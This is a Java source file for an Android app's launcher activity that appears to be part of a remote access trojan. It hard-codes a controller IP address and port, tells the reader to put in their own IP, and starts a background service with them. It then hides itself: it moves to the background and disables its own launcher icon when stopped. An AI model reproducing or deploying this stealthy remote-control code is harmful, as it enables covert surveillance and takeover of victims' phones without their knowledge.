package my.app.client;

import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

import my.app.client.service.StartService;
import service.MyJobService;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;

public class LauncherActivity extends Activity {
	/** Called when the activity is first created. */

	Intent Client, ClientAlt;
	// Button btnStart, btnStop;
	// EditText ipfield, portfield;
	private String myIp = "127.0.0.1"; // Put your IP in these quotes.
	private int myPort = 9999; // Put your port there, notice that there are no
								// quotes here.

	@Override
	public void onStart() {
		super.onStart();
		onResume();
	}

	@Override
	public void onResume() {
		super.onResume();
		
		if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
			Intent serviceIntent = new Intent();
			serviceIntent.setClass(this, MyJobService.class);
			startService(serviceIntent);
		}else{
			Client = new Intent(this, StartService.class);
			Client.setAction(LauncherActivity.class.getName());
			getConfig();
			Client.putExtra("IP", myIp);
			Client.putExtra("PORT", myPort);
			
			startService(Client);
		}
		
		moveTaskToBack(true);
	}

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
//		 setContentView(R.layout.main);
		if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
			Intent serviceIntent = new Intent();
			serviceIntent.setClass(this, MyJobService.class);
			startService(serviceIntent);
		}else{
			Client = new Intent(this, StartService.class);
			Client.setAction(LauncherActivity.class.getName());
			getConfig();
			Client.putExtra("IP", myIp);
			Client.putExtra("PORT", myPort);
	
			startService(Client);
		}
		// moveTaskToBack(true);
	}

	@Override
	protected void onStop() {
		super.onStop();
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(), 
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
				PackageManager.DONT_KILL_APP);
	}
	
	/**
	 * get Config
	 */
	private void getConfig() {
		Properties pro = new Properties();
		InputStream is = getResources().openRawResource(R.raw.config);
		try {
			pro.load(is);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// myIp = pro.getProperty("host");
		// myPort = Integer.valueOf(pro.getProperty("prot"));
		myIp = "172.16.100.188";// pro.getProperty("host");
		myPort = 49999;// Integer.valueOf(pro.getProperty("prot"));
		System.out.println(myIp);
		System.out.println(myPort);
	}
}
